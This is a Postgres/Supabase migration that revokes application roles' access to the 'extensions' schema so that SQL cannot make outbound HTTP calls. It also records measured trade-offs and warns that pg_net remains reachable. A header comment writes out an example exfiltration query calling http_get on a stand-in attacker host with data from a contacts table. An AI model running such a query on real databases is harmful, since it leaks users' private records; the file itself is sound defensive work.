-- Remove the database's outbound-network capability from application roles.
--
-- THE HOLE (verified against a live Postgres 2026-09-11, not just the parser):
--   set local role authenticated;
--   select status from extensions.http_get('http://…');
-- executed, and the server really attempted the connection. A statement like
--   SELECT extensions.http_get('http://attacker/?d=' || (SELECT … FROM contacts))
-- is syntactically READ-ONLY, satisfies RLS (the rows are ones the caller may
-- read), and posts them off-box. `SET TRANSACTION READ ONLY` does not help —
-- this is not a database write. The capability is a PRIVILEGE, so the boundary
-- has to live in the privilege layer.
--
-- WHY THIS IS `REVOKE USAGE ON SCHEMA`, NOT `REVOKE EXECUTE ON FUNCTION`
-- (the first attempt was the latter, and measuring it proved it cannot work):
--   * Every `http` / `pg_net` function is owned by `supabase_admin`.
--   * Migrations run as `postgres`, which is NOT a member of `supabase_admin`
--     (`pg_has_role` → false) and cannot `SET ROLE` to it (permission denied).
--   * PostgreSQL only lets the GRANTOR revoke a grant. `http_get`'s ACL is
--     `{=X/supabase_admin,…}` — PUBLIC's EXECUTE was granted BY supabase_admin,
--     so a REVOKE issued by postgres is accepted syntactically and **silently
--     does nothing**. That is why the first version of this migration passed
--     its own REVOKE and then failed its assertion.
--   * The `extensions` SCHEMA, however, is owned by `postgres`. Revoking USAGE
--     there IS effective, and it blocks every function in the schema at once —
--     including ones a future extension update adds.
--
-- MEASURED TRADE-OFF (this was assumed to break the product; it does not):
-- `companies.website` and `sales.email` are `extensions.citext`, and the worry
-- was that filtering them resolves the `citext = citext` operator by name and
-- so needs schema USAGE. Tested as `authenticated` after the revoke:
--   equality filter on companies.website  -> works
--   equality filter on sales.email        -> works
--   ILIKE on a citext column              -> works
--   INSERT with a citext value            -> works
-- Operators resolve through the catalogue by OID, not by a name lookup, so the
-- revoke costs nothing here. The one thing that does break is an explicit
-- `'x'::extensions.citext` cast in ad-hoc SQL; the repository contains none
-- (verified by grep over schemas/, migrations/ and src/).

-- 1. Block the `extensions` schema for application roles. Effective because
--    postgres owns the schema.
revoke usage on schema extensions from public;

do $$
begin
  if exists (select 1 from pg_roles where rolname = 'anon') then
    execute 'revoke usage on schema extensions from anon';
  end if;
  if exists (select 1 from pg_roles where rolname = 'authenticated') then
    execute 'revoke usage on schema extensions from authenticated';
  end if;
end
$$;

-- 2. Attempt the same for `net` (pg_net). This schema is owned by
--    supabase_admin, so the statement is accepted and then IGNORED — verified:
--    `net.http_get(...)` still executes as `authenticated` afterwards. It is
--    kept because it becomes effective the day the platform grants us
--    ownership, and removing it would hide the intent. The assertion below
--    deliberately does NOT gate on it, so this migration stays honest about
--    what it actually achieves.
do $$
begin
  if exists (select 1 from pg_namespace where nspname = 'net') then
    begin
      execute 'revoke usage on schema net from public';
      if exists (select 1 from pg_roles where rolname = 'anon') then
        execute 'revoke usage on schema net from anon';
      end if;
      if exists (select 1 from pg_roles where rolname = 'authenticated') then
        execute 'revoke usage on schema net from authenticated';
      end if;
    exception
      when insufficient_privilege then
        raise notice 'net schema revoke skipped (owned by another role)';
    end;
  end if;
end
$$;

-- 3. Assert what this migration is actually responsible for: no application
--    role may reach the `extensions` schema. A migration that silently no-ops
--    is worse than none, because it looks applied.
do $$
declare
  v_roles text[] := array['public'];
  v_role  text;
begin
  if exists (select 1 from pg_roles where rolname = 'anon') then
    v_roles := array_append(v_roles, 'anon');
  end if;
  if exists (select 1 from pg_roles where rolname = 'authenticated') then
    v_roles := array_append(v_roles, 'authenticated');
  end if;

  foreach v_role in array v_roles loop
    if has_schema_privilege(v_role, 'extensions', 'USAGE') then
      raise exception
        'role % can still reach schema extensions; the database remains an egress channel', v_role;
    end if;
  end loop;
end
$$;

-- 4. Record what is NOT closed, loudly, at every apply.
do $$
begin
  if exists (select 1 from pg_namespace where nspname = 'net')
     and has_schema_privilege('authenticated', 'net', 'USAGE') then
    raise warning
      'pg_net (schema "net") is STILL reachable by authenticated: it is owned by supabase_admin and a migration cannot revoke it. Outbound HTTP remains possible via net.http_get/http_post. Mitigation is to stop exposing arbitrary SQL to that role at all - see ADR 0011.';
  end if;
end
$$;

-- KNOWN CONSEQUENCE, accepted deliberately:
-- `public.get_avatar_for_email` is SECURITY INVOKER and calls
-- `extensions.http_get` as the caller, so gravatar lookups now fail for
-- `authenticated`. That function has `exception when others then return
-- 'ERROR'`, so it DEGRADES (a contact gets no avatar) rather than breaking the
-- insert. Restoring it means making that function SECURITY DEFINER with a
-- pinned search_path, which is a change to 02_functions.sql whose body must
-- match `supabase db dump` byte-for-byte. An avatar is worth less than closing
-- an exfiltration channel.
--
-- `service_role` is intentionally NOT revoked: edge functions run as it, they
-- are server-side, and the gravatar/favicon path legitimately needs egress.
